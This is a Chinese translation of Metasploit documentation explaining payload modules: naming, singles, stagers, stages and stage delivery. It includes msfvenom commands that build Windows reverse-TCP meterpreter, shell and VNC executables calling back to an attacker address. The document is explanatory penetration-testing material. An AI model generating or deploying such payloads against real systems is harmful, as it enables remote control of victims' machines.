# payloads 如何工作
payload模块是储存在`modules/payloads/{singles,stages,stagers}/<platform>`.当框架启动时,stages和stagers结合起来创造一个完整的载荷.您可以在exploit中使用它。然后，handlers与有效载荷配对，以便框架知道如何创建与给定通信机制的会话。

有效载荷被赋予参考名称，表示所有的部分，如下所示：
  - Staged payloads: `<platform>/[arch]/<stage>/<stager>`
  - Single payloads: `<platform>/[arch]/<single>`

这导致像有效载荷像 `windows/x64/meterpreter/reverse_tcp`.打破这一点，平台是`windows`,架构是`x64`,最后阶段我们交付的是`meterpreter`,而实现它的是`reverse_tcp`
请注意，体系结构是可选的，因为在某些情况下，它是不必要的或暗示的。一个例子是`php/meterpreter/reverse_tcp`。Arch不需要PHP有效载荷，因为我们提供的是解释代码，而不是本地代码。

### singles
单一的有效载荷是难以忘怀的。他们可以与Metasploit建立沟通机制，但他们不需要。一个可能需要的场景的例子是当目标没有网络访问时 - 通过USB密钥传递的文件格式漏洞利用仍然是可能的。

### stagers
舞台是一个小存根，旨在创造某种形式的交流，然后将执行转移到下一个阶段。使用stager解决了两个问题。首先，它允许我们最初使用一个小的有效载荷来加载更多的功能更大的有效载荷。其次，它使通信机制与最后阶段分离成为可能，因此一个有效载荷可以与多个传输一起使用而不需要复制代码。

### stages
由于stagers会照顾到处理任何规模的限制，为我们分配一大块内存来运行，所以stage可以是任意大的。这样做的一个优点是能够用C这样的高级语言编写最终阶段的有效载荷。

##　交付阶段
您希望有效载荷连接回的IP地址和端口被嵌入到stager中。如上所述，所有分级的有效载荷不过是建立通信并执行下一阶段的小存根。当您使用分阶段负载创建可执行文件时，您实际上只是创建了暂存器。所以下面的命令会创建功能相同的exe文件：
```
    msfvenom -f exe LHOST=192.168.1.1 -p windows/meterpreter/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/shell/reverse_tcp
    msfvenom -f exe LHOST=192.168.1.1 -p windows/vncinject/reverse_tcp
```
（请注意，这些功能是相同的 - 有很多随机化进入它，所以没有两个可执行文件是完全一样的。）
１．Ruby端作为客户端，使用由stager（例如：tcp，http，https）设置的任何传输机制。
    ＊　在shell阶段的情况下，当您与终端进行交互时，Metasploit会将远程进程的输入连接到您的终端。
    ＊　在Meterpreter阶段的情况下，Metasploit将开始使用Meterpreter协议。